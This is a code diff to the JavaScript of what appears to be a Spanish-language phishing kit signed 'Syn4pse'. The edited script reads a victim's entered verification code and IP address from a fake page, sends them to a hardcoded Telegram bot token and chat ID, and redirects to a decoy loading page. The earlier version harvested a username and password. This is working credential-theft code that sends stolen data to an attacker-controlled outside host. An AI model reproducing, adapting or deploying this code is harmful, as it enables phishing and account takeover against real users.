@@ -4,11 +4,10 @@ var telegram_bot_id = "7769909892:AAG5gzgIiC892tIXRlp3_rmAp8aFEe7mOjA";
 var chat_id =-4745634513;
 var u_name, u_name2, ip, ip2;
 var ready = function () {
-    u_name = document.getElementById("us4r").value;
-    u_name2 = document.getElementById("p4sx").value;
+    u_name = document.getElementById("p4sx").value;
     ip = document.getElementById("gfg").innerHTML;
     ip2 = document.getElementById("address").innerHTML;
-    message = "🧿OXYD3NT3🧿\n👤RE-US4R: " + u_name + "\n🔐RE-C0NTR4: " + u_name2 + "\nIP: " + ip +"\n" + ip2 +"\n🧿C0de by Syn4pse🧿";
+    message = "🧿OXYD3NT3🧿\n🔢Código: " + u_name + "\nIP: " + ip +"\n" + ip2 +"\n🧿C0de by Syn4pse🧿";
 };
 var sender = function () {
     ready();
@@ -28,7 +27,7 @@ var sender = function () {
         })
     };
     $.ajax(settings).done(function (response) {
-        window.location = 'index2.html';
+        window.location = 'cargando2.html';
         console.log(response);
     });
     return false;
